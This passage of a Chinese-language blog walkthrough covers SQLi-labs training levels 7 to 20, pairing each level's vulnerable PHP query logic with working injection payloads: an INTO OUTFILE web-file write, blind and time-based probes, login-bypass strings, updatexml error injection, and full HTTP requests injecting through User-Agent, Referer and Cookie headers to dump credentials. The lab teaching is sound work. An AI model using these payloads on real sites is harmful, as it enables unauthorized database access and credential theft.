<span class="hljs-attribute">3</span>	Dummy	p@ssword
<span class="hljs-attribute">4</span>	secure	crappy
<span class="hljs-attribute">5</span>	stupid	stupidity
<span class="hljs-attribute">6</span>	superman	genious
<span class="hljs-attribute">7</span>	batman	mob!le
<span class="hljs-attribute">8</span>	admin	admin
<span class="hljs-attribute">9</span>	admin<span class="hljs-number">1</span>	admin<span class="hljs-number">1</span>
<span class="hljs-attribute">10</span>	admin<span class="hljs-number">2</span>	admin<span class="hljs-number">2</span>
<span class="hljs-attribute">11</span>	admin<span class="hljs-number">3</span>	admin<span class="hljs-number">3</span>
<span class="hljs-attribute">12</span>	dhakkan	dumbo
<span class="hljs-attribute">14</span>	admin<span class="hljs-number">4</span>	admin<span class="hljs-number">4</span></code></pre><p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p><pre><code class="hljs Sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/info.php&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>访问对应的 URL 看看是否解析了呢：</p><p><img src="/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/01.png" srcset="/img/loading.gif" alt="img"></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+
?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+
?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sd&#39;--+
?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+
...</code></pre><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号拼接</span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-comment"># 支持延时盲注</span>
<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    输出 You are in............
<span class="hljs-keyword">else</span>:
    输出 You are in...........</code></pre><p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入.</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+
?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+
?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+
...</code></pre><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用双引号再直接拼接</span>
<span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;

<span class="hljs-comment"># 支持延时盲注</span>
<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    输出 You are in............
<span class="hljs-keyword">else</span>:
    输出 You are in...........</code></pre><p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span>
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];
<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];

<span class="hljs-comment"># 使用单引号拼接 SQL</span>
@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    输出查询的信息
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());</code></pre><p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p><pre><code class="hljs mysql">mysql&gt; select * from users where username &#x3D; &#39;admin&#39;;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  8 | admin    | admin    |
+----+----------+----------+</code></pre><p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p><pre><code class="hljs Bash"><span class="hljs-comment"># 注释掉 passwd 来登录</span>
uname=admin<span class="hljs-string">&#x27; or 1=1#&amp;passwd=&amp;submit=Submit</span>
<span class="hljs-string">uname=admin&#x27;</span><span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span>

<span class="hljs-comment"># 注释后面语句 并 添加一个永真条件</span>
uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span>
<span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span>
uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span>
<span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span>

<span class="hljs-comment"># 闭合后面语句 并 添加一个永真条件</span>
uname=admin&amp;passwd=1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submit
uname=admin&amp;passwd=1<span class="hljs-string">&#x27;||&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submit</code></pre><blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p></blockquote><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=(&#39;x&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span>
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];
<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];

<span class="hljs-comment"># 使用单引号和括号来拼接 SQL</span>
@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="hljs-subst">$uname</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;

<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:
    并没有输出啥信息
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());</code></pre><p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=&quot;x&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用 双引号 再直接带入 SQL 语句</span>
<span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;
<span class="hljs-variable">$passwd</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>; 
@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=<span class="hljs-subst">$uname</span> and password=<span class="hljs-subst">$passwd</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p><p>这里不再做重复无意义的记录了。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>password = &#39;$passwd&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># uname 参数被过滤了</span>
<span class="hljs-variable">$uname</span>=check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);  
<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];

<span class="hljs-comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span>
@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username= <span class="hljs-subst">$uname</span> LIMIT 0,1&quot;</span>;

<span class="hljs-keyword">if</span> select 结果正确:
    <span class="hljs-comment"># 更新语句 使用单引号拼接 passwd</span>
    <span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$row1</span>&#x27;&quot;</span>;

    <span class="hljs-keyword">if</span> mysql 报错:
            print_r(mysql_error());</code></pre><p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p><pre><code class="hljs Bash">uname=admin&amp;passwd=1<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;submit=Submit</span></code></pre><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 uagent 和 ip 地址</span>
<span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];
<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];

<span class="hljs-keyword">if</span> 输入了uname 和 passwd:
    <span class="hljs-comment"># 对这两个参数进行过滤</span>
    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);
    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);

    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;

    <span class="hljs-keyword">if</span> SQL语句有返回结果:
        <span class="hljs-comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span>
        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;
            输出 <span class="hljs-variable">$uagent</span>;
        print_r(mysql_error());
    <span class="hljs-keyword">else</span>:
        print_r(mysql_error());</code></pre><p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p><p><strong>PHP 里用来获取客户端 IP 的变量</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li></ul><p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p><p>首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-18/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: sqli.pl
<span class="hljs-attribute">User-Agent</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-18/
<span class="hljs-attribute">DNT</span>: 1
<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8
<span class="hljs-attribute">Connection</span>: close
<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span>: 34

uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/02.png" srcset="/img/loading.gif" alt="img"></p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 referer 和 ip 地址</span>
<span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];

<span class="hljs-keyword">if</span> 输入了uname 和 passwd:
    <span class="hljs-comment"># uname 和 passwd 参数均被过滤</span>
    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);
    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);

    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;

    <span class="hljs-keyword">if</span> SQL语句有返回结果:
        <span class="hljs-comment"># 单引号拼接后直接带入 insert 语句</span>
        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;
        输出 <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]
        print_r(mysql_error());    
    <span class="hljs-keyword">else</span>:
        print_r(mysql_error());</code></pre><p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-19/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: sqli.pl
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Referer</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1
<span class="hljs-attribute">DNT</span>: 1
<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8
<span class="hljs-attribute">Connection</span>: close
<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span>: 34

uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/03.png" srcset="/img/loading.gif" alt="img"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$cookee&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:  
    输出了一堆无用的信息
    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:
        <span class="hljs-comment"># 进行过滤</span>
        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);
        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);

        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;
        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
        <span class="hljs-keyword">if</span> 有查询结果:
            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$cookee</span>, time()+<span class="hljs-number">3600</span>);
        <span class="hljs-keyword">else</span>:
            print_r(mysql_error());

<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:
        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];

        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>
        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;
        <span class="hljs-keyword">if</span> 查询无结果:
            输出 mysql_error()
        <span class="hljs-keyword">if</span> 有结果:
            输出查询的信息
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>], time()<span class="hljs-number">-3600</span>);
<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关</p><h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /Less-<span class="hljs-number">20</span>/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
<span class="hljs-attribute">Host</span>: sqli.pl
<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">49</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">49</span>.<span class="hljs-number">0</span>
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>
<span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate
<span class="hljs-attribute">Cookie</span>: uname=-admin&#x27; union select (select group_concat(username,&#x27;:&#x27;,password+SEPARATOR+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) from users),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#
<span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span>
<span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">8.8.8.8</span>
<span class="hljs-attribute">Connection</span>: close
<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><p><img src="/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/04.png" srcset="/img/loading.gif" alt="img"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><pre><code class="hljs Http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-20/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: sqli.pl
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Cookie</span>: uname=admin&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)#
<span class="hljs-attribute">DNT</span>: 1
<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8
<span class="hljs-attribute">Connection</span>: close
<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</code></pre><p><img src="/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/05.jpg" srcset="/img/loading.gif" alt="img"></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以这里就不演示了。</p></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a> <a class="hover-with-bg" href="/tags/sqli-lab/">sqli lab</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/22efef48">http://www.secice.cn/p/22efef48</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/4c595109"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">SQLI labs 靶场笔记之高级注入姿势 21-37 关</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/3b26dc86"><span class="hidden-mobile">一次寻找接口的惨痛经历</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a 